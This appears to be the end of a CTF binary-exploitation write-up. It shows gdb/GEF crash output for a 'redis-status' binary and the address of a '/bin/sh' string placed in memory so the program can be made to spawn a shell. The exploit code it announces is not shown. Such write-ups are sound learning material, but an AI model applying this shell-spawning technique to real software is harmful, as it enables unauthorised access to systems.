$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff45b40448│+0x0000: 0x00007fff45b40538  →  0x00007fff45b42389  →  "./redis-status"       ← $rsp
0x00007fff45b40450│+0x0008: 0x00007fff45b40538  →  0x00007fff45b42389  →  "./redis-status"
0x00007fff45b40458│+0x0010: 0x00c0ae67faca6f46
0x00007fff45b40460│+0x0018: 0x0000000000000000
0x00007fff45b40468│+0x0020: 0x00007fff45b40548  →  0x00007fff45b42398  →  "COLORFGBG=15;0"
0x00007fff45b40470│+0x0028: 0x0000000000000000
0x00007fff45b40478│+0x0030: 0x00007fbb33150020  →  0x00007fbb331512e0  →  0x0000000000000000
0x00007fff45b40480│+0x0038: 0xff3e250ff2a86f46
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x100400000
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "redis-status", stopped 0x100400000 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

With this i'll search for the address out input /bin/sh is stored in the .data section

```
gef➤  x/s 0x000000000404048
0x404048:       "/bin/sh"
gef➤ 
```

Now that we have the address, here's the exploit 


And we're done xD

<br> <br>
[Back To Home](../../index.md)
<br>



